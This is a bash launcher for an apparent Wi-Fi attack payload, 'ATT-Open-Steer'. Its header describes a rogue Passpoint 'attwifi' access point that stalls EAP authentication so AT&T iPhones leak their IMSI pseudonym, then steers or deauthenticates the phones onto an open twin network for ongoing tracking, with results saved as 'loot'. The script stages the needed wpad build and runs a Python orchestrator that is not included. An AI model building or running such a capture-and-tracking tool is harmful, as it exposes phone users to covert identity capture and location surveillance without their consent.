#!/bin/bash
## Title: ATT-Open-Steer (dual attwifi: Passpoint pseudonym capture + 802.11k/v hand-off)
## Description: Hosts TWO `attwifi` BSSs on the 2.4 GHz radio:
##                1. wlan0wpa -- a Passpoint / HS2.0 WPA2-Enterprise `attwifi`
##                   BSS whose RADIUS server (local, stdlib) stalls the EAP
##                   exchange. An AT&T-provisioned iPhone auto-joins it and
##                   leaks its EAP-AKA' outer identity (IMSI pseudonym) to us.
##                2. wlan0open -- a TRULY OPEN `attwifi` BSS (the hand-off
##                   target) with IE-221 OUIs + WISPr captive portal + DHCP.
##              While the phone is stuck "authenticating" on the Passpoint BSS,
##              we use 802.11k (neighbor report) + 802.11v (BSS Transition
##              Management Request) -- with a plain-deauth fallback -- to steer
##              it onto the OPEN twin, where it associates for real, gets an IP,
##              and can be pinged / RSSI-tracked.
##
##              Rationale: the Passpoint exchange can never complete (no real
##              AT&T HLR/HSS), so it is the *capture* phase; the open twin is
##              the *persistent-tracking* phase. Both share the SSID `attwifi`
##              so the phone's existing profile matches either one.
## Version: 1
## Author: Skinny Research & Development
##
## Notes:
##   - Requires the WPAD-SWAP engine + staged wpad-wolfssl assets (Passpoint
##     IEs and the 802.11k/v control commands need the wolfssl build). The
##     engine bind-mounts wolfssl only while active and ALWAYS restores the
##     factory wpad on exit; a reboot is a universal undo.
##   - Do NOT run over a Wi-Fi SSH session (the wpad restart drops it). Use
##     USB-C Ethernet (br-lan) or on-Pager tmux; the orchestrator refuses
##     otherwise (override with ATT_FORCE_WLAN0CLI=1).
##   - Run inside on-Pager tmux (`tmux new -s steer`) so you can watch it.
##   - Loot: /mmc/root/loot/att-open-steer/run-*/  (run.log, radius.log,
##     wispr.log, dhcpd.log)

set -u

SCRIPT_DIR="$(cd "$(dirname "$0")" 2>/dev/null && pwd)"
PY="$SCRIPT_DIR/att-open-steer.py"

find_engine() {
    for c in "${WPAD_SWAP:-}" \
             /mmc/root/payloads/user/utilities/WPAD-SWAP/wpad-swap.sh \
             /root/payloads/user/utilities/WPAD-SWAP/wpad-swap.sh; do
        [ -n "$c" ] && [ -x "$c" ] && { printf '%s' "$c"; return 0; }
    done
    return 1
}

eng="$(find_engine)" || { ALERT "WPAD-SWAP engine missing.\nRun the Skinny-Tools installer."; exit 1; }

# Stage wolfssl assets if needed.
missing=""
for f in wpad-wolfssl hostapd-wolfssl wpa_supplicant-wolfssl libwolfssl.so.5.9.1.e624513f; do
    [ -f "/mmc/root/wpad-swap/$f" ] || missing="$missing $f"
done
if [ -n "$missing" ]; then
    if [ "$(CONFIRMATION_DIALOG "wpad-wolfssl assets missing:$missing\n\nStage them now?" "Yes" "No")" = "Yes" ]; then
        "$eng" stage || { ALERT "Stage failed."; exit 1; }
    else
        exit 1
    fi
fi

MODE="$(LIST_PICKER "ATT-Open-Steer steering mode?" \
        "btm" "both" "deauth" "Exit" "btm" 2>/dev/null)"
case "$MODE" in
    "Exit"|"") exit 0 ;;
    btm|both|deauth) STEER="$MODE" ;;
    *) STEER="btm" ;;
esac

LOG green "ATT-Open-Steer: steer-mode=$STEER"
# The orchestrator activates wolfssl itself and its cleanup() always restores
# stock (signal + atexit guarded). Run under the engine's `run` wrapper as a
# belt-and-suspenders backstop so stock is restored even on SIGKILL.
"$eng" run -- python3 "$PY" --steer-mode "$STEER" --force 2>&1 | LOG
RC=${PIPESTATUS[0]}
"$eng" stock >/dev/null 2>&1 || true
ALERT "ATT-Open-Steer finished (rc=$RC).\nLoot: /mmc/root/loot/att-open-steer/"
exit "$RC"
